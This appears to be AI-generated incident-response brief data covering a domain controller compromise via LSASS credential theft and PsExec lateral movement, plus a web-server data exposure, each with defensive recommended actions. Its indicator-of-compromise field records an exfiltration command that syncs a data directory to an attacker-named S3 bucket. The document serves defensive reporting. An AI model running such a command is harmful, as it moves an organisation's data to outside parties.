ai_brief.headline: SEV-1 ALERT: Domain Controller Compromise & Active Lateral Movement (DC-CORP-01)
ai_brief.executive_summary: Active high-severity breach detected traversing from endpoint CORP\domain_admin_svc directly into Crown Jewel DC-CORP-01 (Asset Criticality 10.0/10). Attacker dumped LSASS credentials and established remote service execution.
ai_brief.attack_narrative: The attack chain began with spearphishing on finance workstation, leading to PowerShell execution with defenses impaired (T1562.001). Mimikatz/Procdump LSASS credential theft (T1003.001) was leveraged to harvest Domain Admin credentials, followed by PsExec lateral movement (T1021.002) to DC-CORP-01. C2 beaconing to external infrastructure is actively ongoing.
ai_brief.impact_assessment: CRITICAL THREAT TO IDENTITY INFRASTRUCTURE: Potential Active Directory NTDS.dit extraction. Attacker possesses domain-level persistence. Immediate domain-wide isolation required.
recommended_actions: Immediately sever network connectivity for DC-CORP-01 and initial vector endpoints via EDR.
Reset Kerberos KRBTGT password pair twice and revoke all active ticket-granting tickets.
Block outbound traffic to attacker C2 IP(s) on perimeter firewalls.
Initiate Tier-3 Forensic Memory & Disk Capture on Domain Controller.

key_iocs: Observed Command: aws s3 sync /var/data/ s3://exfil-bucket-attacker-shadow/
ai_brief.impact_assessment: HIGH DATA RISK: Exposure of production API tokens and potential customer transaction records. Cloud infrastructure pivot risk if IAM role possesses cross-account permissions.
recommended_actions: Isolate SRV-WEB-PROD-01 at security group / VLAN level to prevent further egress.
Rotate all AWS / Cloud API keys and database credentials present in environment variables.
Review cloud storage bucket access logs for unauthorized object downloads.
Patch vulnerable web application daemon before returning node to load balancer pool.
